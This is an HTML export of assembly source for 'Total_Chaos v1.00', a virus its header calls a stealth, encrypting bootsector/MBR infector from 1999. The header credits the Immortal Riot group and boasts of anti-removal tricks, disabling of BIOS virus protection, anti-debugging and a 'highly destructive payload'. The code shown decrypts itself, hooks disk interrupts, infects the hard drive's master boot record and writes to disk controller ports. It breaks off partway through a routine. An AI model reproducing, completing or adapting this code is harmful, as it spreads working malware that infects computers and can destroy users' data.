<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     NAME: Total_Chaos v1.00</span><span class="sc0">
</span><span class="sc1">;     TYPE: Full-stealth variable encrypting bootsector/MBR infector.</span><span class="sc0">
</span><span class="sc1">;     SIZE: 2 sectors.</span><span class="sc0">
</span><span class="sc1">;   AUTHOR: T-2000 / [Immortal Riot].</span><span class="sc0">
</span><span class="sc1">;   E-MAIL: T2000_@hotmail.com</span><span class="sc0">
</span><span class="sc1">;     DATE: March 1999.</span><span class="sc0">
</span><span class="sc1">;  PAYLOAD: Inferno when being debugged.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  FEATURES:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       - Uses INT 13h &amp; INT 76h to stealth.</span><span class="sc0">
</span><span class="sc1">;       - Infects via INT 13h &amp; direct port-access.</span><span class="sc0">
</span><span class="sc1">;       - Tunneling on INT 13h.</span><span class="sc0">
</span><span class="sc1">;       - Variable encrypts loader &amp; body.</span><span class="sc0">
</span><span class="sc1">;       - Prevents clean-booting.</span><span class="sc0">
</span><span class="sc1">;       - Disables BIOS virus-protection.</span><span class="sc0">
</span><span class="sc1">;       - Anti-debugging code.</span><span class="sc0">
</span><span class="sc1">;       - Highly destructive payload.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Similair to Strange (IR#8) and MegaStealth (VLAD#3), this virus is capable</span><span class="sc0">
</span><span class="sc1">; of stealthing MBR-reads even if the original INT 13h-address is being used.</span><span class="sc0">
</span><span class="sc1">; Aside from this, the virus also sports alot of anti-removal techniques.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Unfortunately I did not have the time to implement floppy-disk port-</span><span class="sc0">
</span><span class="sc1">; infection/stealth, for those interested, [NuKE] wrote an article about</span><span class="sc0">
</span><span class="sc1">; floppy-disk port-access, being published in some IJ-issue.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Hail Satan...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">


                </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
                </span><span class="sc9">.STACK</span><span class="sc0">  </span><span class="sc2">1024</span><span class="sc0">
                </span><span class="sc2">.286</span><span class="sc0">
                </span><span class="sc9">.CODE</span><span class="sc0">


</span><span class="sc5">Virus_Begin</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Boot_Loader</span><span class="sc0">
                </span><span class="sc6">NOP</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'[TOTAL_CHAOS 1.00]'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'[FiRST GENERATiON]'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">

                </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">62</span><span class="sc0">

</span><span class="sc5">Boot_Loader</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Home_TS</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Home_HD</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">End_Encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Encrypted</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7C00h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">End_Encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Init_Key_Loader</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">Decrypt_Byte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                </span><span class="sc1">; Decrypt virus-bootsector.</span><span class="sc0">
</span><span class="sc5">Signature</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Slide_Key_Ldr</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">RCL</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">@1</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc0">                    </span><span class="sc1">; Some overlapping code.</span><span class="sc0">

</span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Decrypt_Byte</span><span class="sc0">

</span><span class="sc5">Encrypted</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7C00h</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">                  </span><span class="sc1">; Setup a stack.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Anti_Debug</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">                  </span><span class="sc1">; DS = 0.</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">413h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">; Steal 2 kB of DOS-memory.</span><span class="sc0">

                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">12h</span><span class="sc0">

                </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">                   </span><span class="sc1">; Calculate hiding-segment.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">512</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">     </span><span class="sc1">; Copy virus-bootsector to</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; our stolen memory.</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSW</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; JMP to resident copy.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Relocated_Boot</span><span class="sc0">
                </span><span class="sc6">RETF</span><span class="sc0">

</span><span class="sc5">Virus_Name</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'TOT4L CHAOS - ABS0LUTE FREEDOM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Relocated_Boot</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Traced_Int13h</span><span class="sc0">
                </span><span class="sc6">MOVSW</span><span class="sc0">
                </span><span class="sc6">MOVSW</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Save the original</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; address of INT 01h.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">New_Int01h</span><span class="sc0"> </span><span class="sc1">; Install our own handler.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">           </span><span class="sc1">; Set TF.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc0">                </span><span class="sc1">; Trace an unknown function.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Traced_Int13h</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">                           </span><span class="sc1">; Clear TF in case INT 13h's</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; entrypoint was not found.</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Restore original INT 01h.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Try_Body_Load</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">                  </span><span class="sc1">; Reset drive.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">7C00h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Home_HD</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Do_Traced_Int13h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0201h</span><span class="sc0">               </span><span class="sc1">; Load the rest of the</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">                 </span><span class="sc1">; virus stored on disk.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">7C00h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Home_TS</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Dispatcher</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Try_Body_Load</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Init_Key_Body</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

</span><span class="sc5">Decrypt_Body</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">             </span><span class="sc1">; Decrypt virus body-sector.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Decrypt_Body</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Port_Stealth_Sw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Prev_Int76h</span><span class="sc0">

                </span><span class="sc6">CLI</span><span class="sc0">

                </span><span class="sc6">MOVSW</span><span class="sc0">
                </span><span class="sc6">MOVSW</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">New_Int76h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Prev_Int13h</span><span class="sc0">

                </span><span class="sc6">MOVSW</span><span class="sc0">
                </span><span class="sc6">MOVSW</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">New_Int13h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">

                </span><span class="sc6">STI</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; ES = 0.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0201h</span><span class="sc0">               </span><span class="sc1">; Make the virus infect C:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">                  </span><span class="sc1">; BX = 7C00h.</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; CX = 01h.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Anti_Debug</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_For_Award</span><span class="sc0">
                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Load_Boot</span><span class="sc0">

</span><span class="sc5">Do_Int19h</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">19h</span><span class="sc0">                     </span><span class="sc1">; Standard way of rebooting.</span><span class="sc0">

</span><span class="sc5">Load_Boot</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">                  </span><span class="sc1">; Start on drive A:</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; Retry up to 3 times.</span><span class="sc0">

</span><span class="sc5">Try_Load_Boot</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">                  </span><span class="sc1">; Reset drive.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0201h</span><span class="sc0">               </span><span class="sc1">; Try to load the bootsector.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Execute_Boot</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Try_Load_Boot</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">                  </span><span class="sc1">; Already tried C: ?</span><span class="sc0">
                </span><span class="sc6">JS</span><span class="sc0">      </span><span class="sc5">Do_Int19h</span><span class="sc0">               </span><span class="sc1">; Then just use INT 19h.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; Now try drive C:</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Try_Load_Boot</span><span class="sc0">

</span><span class="sc5">Execute_Boot</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; Pass control to bootsector.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">RETF</span><span class="sc0">


</span><span class="sc5">Wait_IO_Ready</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">                </span><span class="sc1">; Status-port.</span><span class="sc0">

</span><span class="sc5">Get_IO_Status</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">                  </span><span class="sc1">; Controller is executing</span><span class="sc0">
                </span><span class="sc6">JS</span><span class="sc0">      </span><span class="sc5">Get_IO_Status</span><span class="sc0">           </span><span class="sc1">; a command ?</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Do_Traced_Int13h</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">
</span><span class="sc5">Traced_Int13h</span><span class="sc0">   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">CLD</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">


</span><span class="sc5">Dispatcher</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">                  </span><span class="sc1">; Can only use ports on</span><span class="sc0">
                </span><span class="sc6">JNS</span><span class="sc0">     </span><span class="sc5">Do_Traced_Int13h</span><span class="sc0">        </span><span class="sc1">; harddrives.</span><span class="sc0">

                </span><span class="sc6">PUSHA</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1F2h</span><span class="sc0">                </span><span class="sc1">; Amount of sectors.</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; Sector number.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; Track low.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; Track high</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
